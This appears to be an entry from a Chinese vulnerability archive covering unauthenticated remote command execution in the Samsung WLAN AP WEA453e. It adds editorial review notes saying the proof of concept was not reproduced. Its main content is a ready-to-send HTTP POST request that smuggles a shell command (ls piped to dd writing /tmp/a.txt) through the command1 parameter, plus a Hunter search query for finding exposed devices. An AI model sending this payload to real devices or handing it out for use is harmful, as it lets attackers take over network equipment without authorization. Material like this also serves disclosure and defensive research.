---
source: "wy876 漏洞文库"
id: "vw-1c708957f4a08ece332f52ee"
entity_id: "ve-1c708957f4a08ece332f52ee"
schema_version: "1"
fofa_unverified: "web.title="
title: "三星路由器WLAN AP 远程命令执行漏洞"
product: "Samsung WLAN AP WEA453e"
record_type: "advisory"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "声称无认证，无固件版本"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87/%E4%B8%89%E6%98%9F%E8%B7%AF%E7%94%B1%E5%99%A8/%E4%B8%89%E6%98%9F%E8%B7%AF%E7%94%B1%E5%99%A8WLANAP%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md"
review_date: "2026-10-02"
side_effects: "文中写入/上传步骤会创建或覆盖目标文件；须先核对服务账户写权限、保存路径和脚本解析条件，验证后按原路径核查残留；执行文中载荷可能以目标进程权限启动命令或加载代码；权限受认证角色、操作系统账户及依赖版本约束，不能把 root/200 等通用字符串当成功证据"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/ae6xqzhcp3o4cl3m"
source_status: "recorded"
---

# 三星路由器WLAN AP 远程命令执行漏洞

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：Samsung WLAN AP WEA453e
- 本文讨论：download command1 shell命令执行
- 版本、权限与配置前提：声称无认证，无固件版本
- 资料类型：命令执行请求摘要；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- 同294入口与写回机制重稿但无输出；fofa实际Hunter残缺字段
- 固定Content-Length需与正文一致，缺补丁
- 已落实的文本修订：HTTP 报文围栏改为 http；残缺指纹退出可执行索引并保留原值。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证

### 操作风险与恢复

- 文中写入/上传步骤会创建或覆盖目标文件；须先核对服务账户写权限、保存路径和脚本解析条件，验证后按原路径核查残留
- 执行文中载荷可能以目标进程权限启动命令或加载代码；权限受认证角色、操作系统账户及依赖版本约束，不能把 root/200 等通用字符串当成功证据

### 待核与来源

- 版本及认证状态待原始来源确认
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


# 一、漏洞简介
三星 WLAN AP WEA453e路由器存在远程命令执行漏洞，可在未授权的情况下执行任意命令获取服务器权限。

# 二、影响版本
+ 三星 WLAN AP WEA453e路由器

# 三、资产测绘
+ hunter`web.title="Samsung WLAN AP"`
+ 特征


# 四、漏洞复现
```http
POST /(download)/tmp/a.txt HTTP/1.1
Host: xx.xx.xx.xx
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/119.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 36

command1=shell:ls | dd of=/tmp/a.txt
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/ae6xqzhcp3o4cl3m>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
